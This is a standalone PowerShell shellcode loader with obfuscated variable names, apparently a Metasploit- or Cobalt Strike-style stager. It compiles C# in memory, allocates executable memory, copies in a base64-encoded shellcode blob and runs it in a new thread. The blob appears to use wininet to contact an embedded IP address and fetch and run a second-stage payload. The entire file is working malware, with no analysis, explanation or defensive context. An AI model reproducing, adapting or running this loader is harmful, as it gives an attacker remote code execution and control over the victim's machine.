Set-StrictMode -Version 2
$zWal = @"
	using System;
	using System.Runtime.InteropServices;
	namespace qDQZ {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$yu = New-Object Microsoft.CSharp.CSharpCodeProvider
$vD16U = New-Object System.CodeDom.Compiler.CompilerParameters
$vD16U.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$vD16U.GenerateInMemory = $True
$xV = $yu.CompileAssemblyFromSource($vD16U, $zWal)

[Byte[]]$jC = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1obmV0AGh3aW5pVGhMdyYH/9Ux21NTU1NTaDpWeaf/1VNTagNTU2gCBAAA6KgAAAAvSEplaTdMT2dPNm1wLWFqNDh5Z0xnZ051OEEybzhfbjF1VGcyUmd2ZndBQQBQaFeJn8b/1YnGU2gAAmCEU1NTV1NWaOtVLjv/1ZZqCl9TU1NTVmgtBhh7/9WFwHUUaIgTAABoRPA14P/VT3Xh6EsAAABqQGgAEAAAaAAAQABTaFikU+X/1ZNTU4nnV2gAIAAAU1ZoEpaJ4v/VhcB0z4sHAcOFwHXlWMNf6H////83MS4xOTMuMTU5LjI0NAC78LWiVmoAU//V")

$yEt = [qDQZ.func]::VirtualAlloc(0, $jC.Length + 1, [qDQZ.func+AllocationType]::Reserve -bOr [qDQZ.func+AllocationType]::Commit, [qDQZ.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$yEt) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($jC, 0, $yEt, $jC.Length)
[IntPtr] $jcCxA = [qDQZ.func]::CreateThread(0,0,$yEt,0,0,0)
if ([Bool]!$jcCxA) { $global:result = 7; return }
$s3 = [qDQZ.func]::WaitForSingleObject($jcCxA, [qDQZ.func+Time]::Infinite)
